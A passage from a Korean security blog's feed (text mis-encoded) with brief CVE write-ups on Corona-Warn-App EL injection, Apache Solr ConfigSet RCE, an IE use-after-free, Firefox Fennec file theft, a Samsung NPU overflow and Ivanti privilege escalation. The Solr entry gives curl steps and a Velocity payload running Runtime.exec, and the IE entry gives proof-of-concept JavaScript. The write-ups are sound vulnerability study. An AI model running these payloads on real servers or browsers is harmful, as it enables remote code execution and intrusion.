class="hljs-built_in">cd</span></code></pre><p>custom constraint validation ë™ì‘ ì¤‘ í•¨ìˆ˜<code>buildConstraintViolationWithTemplate()</code>ëŠ” ë©”ì„¸ì§€ í…œí”Œë¦¿ì„ ì—ëŸ¬ ë©”ì„¸ì§€ë¡œ ë³€í™˜ì‹œì¼œì¤ë‹ˆë‹¤. ë©”ì„¸ì§€ í…œí”Œë¦¿ì— <code>$&#123;&#125;</code>ë¥¼ í†µí•´ Expression Languageë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìœ¼ë©° ê·¸ ì‹¤í–‰ê²°ê³¼ê°€ ì—ëŸ¬ ë©”ì„¸ì§€ì— ë°˜ì˜ë©ë‹ˆë‹¤. ë§Œì•½ ì´ ë©”ì„¸ì§€ í…œí”Œë¦¿ì˜ ë‚´ìš©ì„ í•´ì»¤ê°€ ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´ RCE ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void add<span class="hljs-constructor">Violation(ConstraintValidatorContext <span class="hljs-params">validatorContext</span>, String <span class="hljs-params">message</span>)</span>&#123;    validatorContext.build<span class="hljs-constructor">ConstraintViolationWithTemplate(<span class="hljs-params">message</span>)</span>.add<span class="hljs-constructor">ConstraintViolation()</span>;&#125;</code></pre><p>CWA ì„œë²„ëŠ” <code>buildConstraintViolationWithTemplate()</code>ì„ í˜¸ì¶œí•˜ë©° ê·¸ ì¸ìì¸ messageëŠ” ì‚¬ìš©ì ì…ë ¥ê°’(Diagnosis key ì† ë°ì´í„°)ì´ê¸° ë•Œë¬¸ì— RCE ê³µê²©ì— ì·¨ì•½í•©ë‹ˆë‹¤. ì‚¬ìš©ì ì…ë ¥ì„ sanitizing í•˜ë„ë¡ íŒ¨ì¹˜ë˜ì—ˆì§€ë§Œ, bypassê°€ ê°€ëŠ¥í•˜ë‹¤ëŠ” í‰ì´ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>rce</tag>
      
      <tag>covid19</tag>
      
      <tag>ios</tag>
      
      <tag>germany</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</title>
    <link href="/2020/11/20/l0ch/2020-11-20/"/>
    <url>/2020/11/20/l0ch/2020-11-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957">CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Apache Solr 6.6.0-6.6.5<br>Apache Solr 7.0.0-7.7.3<br>Apache Solr 8.0.0-8.6.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache SolrëŠ” Apache Luceneì„ ê¸°ë°˜ìœ¼ë¡œ ë§Œë“¤ì–´ì§„ ê²€ìƒ‰ ì—”ì§„ì…ë‹ˆë‹¤. ì‚¬ìš©ìëŠ” íŠ¹ì • í˜•ì‹ì˜ XML íŒŒì¼ì„ ì„œë²„ì— ì—…ë¡œë“œí•˜ì—¬ ì¸ë±ìŠ¤ë¥¼ ìƒì„±í•˜ê±°ë‚˜ ê²€ìƒ‰ ìš”ì²­ì„ í•˜ì—¬ ê²°ê³¼ë¥¼ XML í˜•ì‹ìœ¼ë¡œ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ëŸ¬í•œ Solrì˜ ConfigSet API ì— unauthrization config upload ê°€ ê°€ëŠ¥í•´ RCEê¹Œì§€ ì´ì–´ì§ˆ ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì‚¬ìš©ìëŠ” ConfigSet APIë¥¼ ì‚¬ìš©í•´ configsetì„ ì—…ë¡œë“œí•˜ê³  logical indexë¥¼ êµ¬ì„±í•˜ëŠ” ì»¬ë ‰ì…˜ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë•Œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì— ì•…ìš©ë  ìˆ˜ ìˆëŠ” ì¼ë¶€ ê¸°ëŠ¥ë“¤ì„ í•„í„°ë§í•´ ì•…ì„± ì»¬ë ‰ì…˜ì´ êµ¬ì„±ë˜ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ <code>configset.upload.enabled</code> ì˜µì…˜ì´ trueë¡œ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´ ì´ë¥¼ UPLOAD ì™€ CREATE ë¡œ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li><p>ë¨¼ì € ì•…ì„± configsetì„ í¬í•¨í•˜ëŠ” ì••ì¶• íŒŒì¼ì„ UPLOAD í•©ë‹ˆë‹¤. </p> <pre><code class="hljs jsx">curl -X POST --header <span class="hljs-string">&quot;Content-Type:application/octet-stream&quot;</span>--data-binary@<span class="hljs-number">7.</span>zip <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=UPLOAD&amp;name=file1&quot;</span></code></pre></li><li><p>CREATEëŠ” ê¸°ì¡´ configsetì„ ê¸°ë°˜ìœ¼ë¡œ ìƒˆë¡œìš´ configsetì„ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ UPLOADëœ configsetì„ ê¸°ë°˜ìœ¼ë¡œ ìƒˆë¡œìš´ configsetì„ ë§Œë“¤ë©´ ì•…ìš© ê°€ëŠ¥í•œ ê¸°ëŠ¥ë“¤ì„ í•„í„°ë§ì„ í•˜ì§€ ì•Šì•„ ì¸ì¦ ê²€ì‚¬ ë¡œì§ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=CREATE&amp;name=file3&amp;baseConfigSet=file1&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true&quot;</span></code></pre></li><li><p>2ì—ì„œ ì–»ì€ ìƒˆë¡œìš´ configsetë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì•…ì„± ì»¬ë ‰ì…˜ì„ ìƒì„±í•©ë‹ˆë‹¤.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/collections?action=CREATE&amp;numShards=1&amp;name=file2&amp;collection.configName=file3&quot;</span></code></pre></li><li><p>ìƒì„±ëœ ì•…ì„± ì»¬ë ‰ì…˜ì€ ì›ê²© ì½”ë“œ ì‹¤í–‰ì— ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p> <pre><code class="hljs jsx">http:<span class="hljs-comment">//[host]/solr/newCollection3/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=&#x27;&#x27;)+%23set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span></code></pre></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.secpulse.com/archives/144081.html">https://www.secpulse.com/archives/144081.html</a></p><p><a href="https://issues.apache.org/jira/browse/SOLR-14925">https://issues.apache.org/jira/browse/SOLR-14925</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>apache solr</tag>
      
      <tag>unauthrization upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17053: Internet Explorer UAF ì·¨ì•½ì </title>
    <link href="/2020/11/19/idioth/2020-11-19/"/>
    <url>/2020/11/19/idioth/2020-11-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Internet Explorerì—ì„œ neutering ArrayBufferë¡œ ì¸í•œ use after free ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ CVE-2020-1380ê³¼ ë¹„ìŠ·í•œ ì·¨ì•½ì ì´ì§€ë§Œ JIT ì—”ì§„ ì—†ì´ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>JIT ì—”ì§„ì„ ì‚¬ìš©í•˜ì§€ ì•Šê³  itemì„ TypedArrayë¡œ ë³€í™˜í•  ë•Œ <em>jscript.dll</em>ì€ interpreterì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p><ol><li><code>Js::JavascriptConversion::ToNumber()</code> í˜¸ì¶œ</li><li>TypedArrayì˜ ArrayBufferê°€ detach ë˜ì—ˆëŠ”ì§€ í™•ì¸</li><li>ë³€í™˜í•  elementì˜ indexì™€ TypedArrayì˜ ê¸¸ì´ ë¹„êµ</li><li><code>Js::JavascriptConversion::ToNumber()</code>ë¥¼ ë‹¤ì‹œ í˜¸ì¶œí•˜ì—¬ ArrayBufferë¡œ ê°’ ì„¤ì •</li></ol><p><code>Js::JavascriptConversion::ToNumber()</code>ì˜ ì²« ë²ˆì§¸ í˜¸ì¶œì—ì„œ í•´ì»¤ëŠ” callback í•¨ìˆ˜ë¥¼ í†µí•´ TypedArrayì˜ ArrayBufferë¥¼ free í•  ìˆ˜ ìˆê³  uafë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ê²ƒì„ ë§‰ê¸° ìœ„í•´ ì²« ë²ˆì§¸ í˜¸ì¶œ í›„ ArrayBufferê°€ detach ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ì—¬ user code callbackì—ì„œ ë©”ëª¨ë¦¬ê°€ free ë˜ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ ë‘ ë²ˆì§¸ í˜¸ì¶œì—ì„œëŠ” ë³„ë‹¤ë¥¸ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ì´ë¥¼ ì•…ìš©í•˜ì—¬ uafë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><details><summary>POC Code</summary><p><pre><code class="hljs js"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float32Array</span>(<span class="hljs-number">0x100</span>);<span class="hljs-keyword">var</span> flag = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">index, value</span>) </span>&#123;    arr[index] = value;&#125;<span class="hljs-keyword">var</span> obj = &#123;&#125;;obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>) &#123;        worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;&quot;</span>);        worker.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;;        worker.postMessage(<span class="hljs-number">0</span>, [arr.buffer]);        worker.terminate();        worker = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;    &#125;    flag = <span class="hljs-number">1</span>;&#125;;pwn(<span class="hljs-number">0</span>, obj);</code></pre></p></details><p>ë‘ ë²ˆì§¸ ì¸ìë¥¼ <code>obj</code>ë¡œ <code>pwn</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ itemì„ TypedArrayë¡œ ë³€í™˜í•  ë•Œ <code>Js::JavascriptConversion::ToNumber()</code>ê°€ í˜¸ì¶œë˜ì–´ callback í•¨ìˆ˜ê°€ ë‘ ë²ˆ í˜¸ì¶œë©ë‹ˆë‹¤. ì²« ë²ˆì§¸ í˜¸ì¶œì—ëŠ” <code>flag == 0</code>ì´ë¯€ë¡œ ArrayBufferê°€ neutering ë˜ì§€ ì•Šì§€ë§Œ ë‘ ë²ˆì§¸ í˜¸ì¶œì—ì„œ ArrayBufferê°€ neutering ë©ë‹ˆë‹¤. ë‘ ë²ˆì§¸ í˜¸ì¶œì—ì„œëŠ” ArrayBufferê°€ detach ë˜ì—ˆëŠ”ì§€ ê²€ì‚¬í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ uafê°€ ë°œìƒí•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>use after free</tag>
      
      <tag>idioth</tag>
      
      <tag>internet explorer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-15647: website stealing files from device</title>
    <link href="/2020/11/18/fabu1ous/2020-11-18/"/>
    <url>/2020/11/18/fabu1ous/2020-11-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@kanytu/firefox-and-how-a-website-could-steal-all-of-your-cookies-581fe4648e8d">Firefox: How a website could steal all your cookies</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firefox Fennec v68.9.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox Fennecì—ì„œ Arbitrary local file access ì·¨ì•½ì (CVE-2020â€“15647)ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•œ í•´ì»¤ì˜ ì›¹ ì‚¬ì´íŠ¸ì— ì ‘ì†í•˜ë©´ í•¸ë“œí°ì˜ íŒŒì¼ì„ íƒˆì·¨ë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì•ˆë“œë¡œì´ë“œìš© <code>Firefox Content Provider</code>ì˜ misconfigureë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ìœ¼ë¡œ Firefoxì—ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ëª¨ë“  íŒŒì¼ì„ ì›¹í˜ì´ì§€ê°€ ì½ì„ ìˆ˜ ìˆê³  í•´ì»¤ì˜ ì›¹ ì„œë²„ë¡œ ë‚´ìš©ì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ì´ìœ ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>content://</code> URIë¡œ íŒŒì¼ì„ ì—´ë©´ íŒŒì¼ëª…ì„ ë°”ê¾¸ì§€ ì•Šê³  cache í•œ ë’¤ ê·¸ê³³ìœ¼ë¡œ redirect í•©ë‹ˆë‹¤.</li><li><a href="https://developer.android.com/training/secure-file-sharing/setup-sharing">file content provider</a>ì˜ ê³µìœ  ê°€ëŠ¥ ë””ë ‰í„°ë¦¬ê°€ root-pathë¡œ ì„¤ì •ë¼ìˆìŠµë‹ˆë‹¤.</li></ol><p>ë¸Œë¼ìš°ì €ëŠ” ë¡œì»¬ html íŒŒì¼ì„ ì—´ ë•Œ <code>content://</code> URIë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. victim deviceì—ì„œ íƒˆì·¨í•˜ê³ ì í•˜ëŠ” íŒŒì¼(ì´í•˜ target)ê³¼ ë™ì¼í•œ ì´ë¦„ì˜ ì•…ì„± html íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì‹¤í–‰í•˜ë©´ Firefoxê°€ íŒŒì¼ëª…ì„ ìœ ì§€í•œ ì±„ë¡œ cache í•©ë‹ˆë‹¤. ì•…ì„± html íŒŒì¼ì€ ë¸Œë¼ìš°ì €ê°€ targetì„ <code>content://</code>ë¡œ ì—´ê²Œ í•˜ê³  ê¸°ì¡´ì— cache ëœ íŒŒì¼ì´ targetì˜ ë‚´ìš©ìœ¼ë¡œ overwrite ë©ë‹ˆë‹¤. ì•…ì„± htmlì´ ì´ë¥¼ íŒŒì‹±í•´ í•´ì»¤ì˜ ì›¹ ì„œë²„ë¡œ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>firefox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Samsung Neural Processing Unit memory corruption in shared memory parsing</title>
    <link href="/2020/11/17/l0ch/2020-11-17/"/>
    <url>/2020/11/17/l0ch/2020-11-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2073">Samsung NPU (Neural Processing Unit) memory corruption in shared memory parsing</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Samsungâ€™s Exynos-based devices (including Neural Processing Unit)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì‚¼ì„±ì˜ ì—‘ì‹œë…¸ìŠ¤ ëª¨ë°”ì¼ í”„ë¡œì„¸ì„œì— í¬í•¨ëœ NPU(Neural Processing Unit)ëŠ” ë¨¸ì‹ ëŸ¬ë‹ ì—°ì‚°ì— ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ NPUì˜ Neural Network Feature Mapsë¥¼ íŒ¨í‚¤ì§•í•˜ëŠ”ë° ì‚¬ìš©ë˜ëŠ” <code>NCP</code> êµ¬ì¡°ì²´ì˜ ì…ë ¥ ê°’ ê²€ì¦ì„ í•˜ì§€ ì•Šì•„ memory corruptionì´ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Convolution Neural Network Feature Maps(IFM / OFM)ì„ íŒ¨í‚¤ì§•í•˜ëŠ” <code>npu_session_s_graph</code> ì—ì„œëŠ” ë¨¼ì €<code>__get_session_info</code> ë¥¼ í˜¸ì¶œí•´ ì‚¬ìš©ì ì˜ì—­ ION ë©”ëª¨ë¦¬ ë²„í¼ë¥¼ ì»¤ë„ ë©”ëª¨ë¦¬ì— ë§¤í•‘í•©ë‹ˆë‹¤.</p><blockquote><p>ION - process ê°„ ë©”ëª¨ë¦¬ ê³µìœ ë¥¼ ìœ„í•œ ë©”ëª¨ë¦¬ í• ë‹¹ì</p></blockquote><p>ê·¸ë¦¬ê³  <code>__config_sesison_info</code>ë¥¼ í˜¸ì¶œí•´ ë§¤í•‘ëœ ë©”ëª¨ë¦¬ë¥¼ íŒŒì‹±í•˜ëŠ”ë°, ì•„ë˜ì™€ ê°™ì€ ê³¼ì •ì—ì„œ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li><code>__pilot_parsing_ncp</code> ì—ì„œ <code>temp_IFM_av</code> ë²„í¼ì˜ í¬ê¸°ëŠ” ì‚¬ìš©ì ì˜ì—­ ê³µìœ  ë©”ëª¨ë¦¬ì—ì„œ ê°€ì ¸ì˜¨  <code>ncp-&gt; memory_vector_cnt</code> ì„ ì‚¬ìš©í•´ ë¨¼ì € ê³„ì‚°ë©ë‹ˆë‹¤.</li><li>TOCTOU ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•´ ì‚¬ìš©ì ì˜ì—­ì—ì„œ <code>ncp-&gt; memory_vector_cnt</code> ì˜ ê°’ì„ ë” í° ê°’ìœ¼ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.</li><li>ì´í›„ <code>__second_parsing_ncp</code> ì—ì„œ <code>ncp-&gt; memory_vector_cnt</code> ë¥¼ ë‹¤ì‹œ ì½ì–´ <code>temp_IFM_av</code> ë²„í¼ì— ë³µì‚¬í•©ë‹ˆë‹¤.</li><li>2ë‹¨ê³„ì—ì„œ í° ê°’ìœ¼ë¡œ ë³€ê²½ëœ <code>ncp-&gt; memory_vector_cnt</code> ë¡œ ì¸í•´ <code>temp_IFM_av</code> ë²„í¼ì˜ ì‚¬ì´ì¦ˆë³´ë‹¤ ë” ë§ì€ ê°’ì„ ë³µì‚¬í•˜ê²Œ ë˜ê³  ì´ë•Œ bounds checkë¥¼ í•˜ì§€ ì•Šì•„ heap buffer overflowê°€ ë°œìƒí•©ë‹ˆë‹¤.</li></ol><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì´ìš©í•˜ë©´ ì»¤ë„ ìŠ¤ë ˆë“œ ìŠ¤íƒì„ í¬í•¨í•´ vmapì˜ ì»¤ë„ ë²„í¼ ë²”ìœ„ë¥¼ ë²—ì–´ë‚˜ ë°ì´í„°ë¥¼ ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>toctou</tag>
      
      <tag>samsung</tag>
      
      <tag>L0ch</tag>
      
      <tag>npu</tag>
      
      <tag>neural processing unit</tag>
      
      <tag>heap buffer overflow</tag>
      
      <tag>exynos</tag>
      
      <tag>shared memory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Two Privilege Escalation Vulnerability in Ivanti Unified Endpoint Manager</title>
    <link href="/2020/11/16/idioth/2020-11-16/"/>
    <url>/2020/11/16/idioth/2020-11-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.jumpsec.com/detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/">Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Unified Endpoint Manager &lt;= 2020.1.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><strong>CVE-2020-13770: Named pipe token impersonation</strong></p><p>í•´ë‹¹ ì·¨ì•½ì ì€ í”„ë¡œì„¸ìŠ¤ê°€ named pipe objectë¥¼ ì—´ ë•Œ ë³´ì•ˆ attributeê°€ ë¶€ì ì ˆí•˜ì—¬ ë°œìƒí•œ ì·¨ì•½ì ì…ë‹ˆë‹¤. </p><p><code>CreateFile</code>ì˜ <code>dwFlagsAndAttributes</code> ì¸ìê°€ ì•„ë˜ì™€ ê°™ì€ attributeì¼ ë•Œ ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><ul><li>SECURITY_DELEGATION</li><li>SECURITY_IMPERSONATION</li></ul><p>ìœ„ì˜ ë‘ attribute ì¤‘ í•˜ë‚˜ë¡œ named pipeë¥¼ ì—´ë©´ ì„œë²„ëŠ” í´ë¼ì´ì–¸íŠ¸ í† í°ì„ ì–»ê³  ì¶”í›„ access checkì— ì‚¬ìš©í•©ë‹ˆë‹¤. pipe ì„œë²„ëŠ” pipe í´ë¼ì´ì–¸íŠ¸ì˜ ê¶Œí•œ, security context ë“±ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì„œë²„ë³´ë‹¤ í´ë¼ì´ì–¸íŠ¸ì˜ ê¶Œí•œì´ ë†’ìœ¼ë©´ ì„œë²„ëŠ” ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><strong>CVE-2020-13771: DLL search order hijacking</strong></p><p>í•´ë‹¹ ì·¨ì•½ì ì€ ìœˆë„ìš°ì˜ <a href="https://docs.microsoft.com/ko-kr/windows/win32/dlls/dynamic-link-library-search-order">DLL Search Order</a>ë¥¼ ì´ìš©í•œ ì·¨ì•½ì ì…ë‹ˆë‹¤. <code>SafeDllSearchMode</code> ì„¤ì •ì— ê´€ê³„ì—†ì´ í”„ë¡œì„¸ìŠ¤ê°€ DLL íŒŒì¼ì„ ì°¾ì§€ ëª»í•˜ë©´ í™˜ê²½ ë³€ìˆ˜ PATHì—ì„œ íŒŒì¼ì„ ì°¾ìŠµë‹ˆë‹¤. í•´ì»¤ê°€ í™˜ê²½ ë³€ìˆ˜ì— ë“±ë¡ëœ í´ë”ì— ì¡°ì‘ëœ DLL íŒŒì¼ì„ ë°°ì¹˜í•˜ë©´ ì·¨ì•½í•œ í”„ë¡œì„¸ìŠ¤ê°€ í•´ë‹¹ DLLì„ ë¡œë“œí•˜ê³  ê·¸ í”„ë¡œì„¸ìŠ¤ì˜ contextë¡œ <code>DllMain</code>ì´ ì‹¤í–‰ë˜ì–´ ê¶Œí•œìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ í”„ë¡œê·¸ë¨ì—ì„œ ì•…ìš©í•  ìˆ˜ ìˆëŠ” dll íŒŒì¼ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>ldprofileui.dll</li><li>wfapi.dll</li><li>DMIAPI32.DLL</li><li>logonsrv.dll</li><li>OOBCredentials.dll</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>lpe</tag>
      
      <tag>idioth</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>dll search order</tag>
      
      <tag>named pipe</tag>
      
      <tag>impersonation attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing ë§›ë³´ê¸° Part 1</title>
    <link href="/2020/11/15/l0ch/windows-patch-diffing-part1/"/>
    <url>/2020/11/15/l0ch/windows-patch-diffing-part1/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”! L0chì…ë‹ˆë‹¤. ì €ë²ˆ <a href="https://hackyboiz.github.io/2020/11/01/l0ch/cve-2020-1464/">GlueBall ì·¨ì•½ì </a> ê¸€ ì¼ì„ ë•Œ ë””í•‘ í•  ë²„ì „ë³„ ë°”ì´ë„ˆë¦¬ë¥¼ êµ¬í•˜ë‹¤ê°€ ë©˜íƒˆì´ íŒŒì‡„ê¸°ì— ê°ˆë¦° ì¢…ì´ë§ˆëƒ¥ ê°ˆë¦´ ë»”í–ˆì£ ?</p><p>ìƒê°í•´ë³´ë‹ˆê¹Œ ê´œíˆ Diffing í•˜ê² ë‹¤ê³  ê±´ë“œë ¸ë‹¤ê°€ Xê³ ìƒí–ˆëŠ”ë° ì´ëŒ€ë¡œ ê°€ë§Œíˆ ìˆìœ¼ë©´ ì™ ì§€ ì–µìš¸í•˜ìë‚˜ì—¬. ê·¸ë˜ì„œ ì´ ì°¸ì— ì¢€ ì‰½ê²Œ ì‰½ê²Œ ê°ˆ ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ì°¾ëŠë¼ ë°©í™©í•˜ë˜ ì¤‘ ì—„ì²­ë‚œ ê¸€ì„ ë°œê²¬í•˜ê²Œ ë˜ëŠ”ë°..</p><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p><p>ì´ê±° ì™„ì „ ë‚˜ë¥¼ ìœ„í•œ ê¸€ì´ì–ì•„??ã…</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/1.png"></p><p>ê·¸ë˜ì„œ! ë°”ë¡œ ì •ë¦¬ì— ë“¤ì–´ê°”ì£ . ì•ìœ¼ë¡œ í•  ì‚½ì§ˆì€ ê¿ˆì—ë„ ëª¨ë¥¸ ì±„ ã…‹ã…‹ ì•„</p><h1 id="Diffing-ì´-ë­”ë°"><a href="#Diffing-ì´-ë­”ë°" class="headerlink" title="Diffing ì´ ë­”ë°?"></a>Diffing ì´ ë­”ë°?</h1><p>ê°„ë‹¨í•˜ê²Œ Binary Diffingì´ ë­”ì§€ ì§šê³  ë„˜ì–´ê°€ ë´…ì‹œë‹¤!</p><blockquote><p>Diffing ì€ ì¼ë°˜ì ìœ¼ë¡œ 